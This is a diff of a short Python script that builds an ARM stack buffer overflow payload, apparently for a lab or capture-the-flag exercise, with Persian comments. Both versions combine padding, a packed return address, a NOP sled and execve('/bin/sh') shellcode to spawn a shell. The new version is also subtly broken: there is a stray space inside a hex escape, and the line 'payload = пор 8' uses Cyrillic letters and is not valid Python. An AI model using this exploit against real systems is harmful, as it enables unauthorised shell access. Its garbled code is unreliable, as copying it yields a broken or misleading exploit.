@@ -1,20 +1,20 @@
 import struct
+import sys
 
-offset = 68
-buf = 0xb6fb4198 + 100  # 100 بایت بعد از بافر
+shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1 a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x00"
 
-shellcode = (
-    b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40"
-    b"\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e"
-    b"\x2f\x73\x68\x00"
-)
-
-nop = b"\x00\x00\xa0\xe1"  # mov r0, r0
-
-payload = b"A" * offset
-payload += struct.pack("<I", buf + 50)  # وسط NOP sled
-payload += nop * 100  # NOP sled بزرگ
+ret_addr = 0xf6fff0e0
+packed_addr = struct.pack("<I", ret_addr)
+nop = b"\x01\x10\xa0\xe1"
+payload_len = 68
+payload = пор 8
 payload += shellcode
 
-with open("big_nop.bin", "wb") as f:
-    f.write(payload)
+padding_len = payload_len-len(payload)
+payload += b"A" * padding_len 
+payload += packed_addr
+if sys.version_info[0] < 3:
+    sys.stdout.write(payload)
+else:
+    sys.stdout.buffer.write(payload)
+
